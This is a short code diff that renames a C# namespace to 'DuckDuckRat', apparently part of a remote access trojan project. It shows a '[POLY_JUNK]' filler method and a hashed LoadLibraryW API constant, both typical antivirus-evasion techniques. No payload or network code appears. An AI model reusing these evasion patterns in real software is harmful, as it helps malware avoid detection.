@@ -1,9 +1,9 @@
-namespace VanguardCore
+namespace DuckDuckRat
 {
     public static class APIConstants
     {
         // [POLY_JUNK]
-        private static void _vanguard_2e3ea063() {
+        private static void _DuckDuckRat_2e3ea063() {
             int val = 26919;
             if (val > 50000) Console.WriteLine("Hash:" + 26919);
         }
@@ -26,3 +26,5 @@ namespace VanguardCore
         public const uint HASH_LoadLibraryW = 0x9FA0B1C2;
     }
 }
+
+
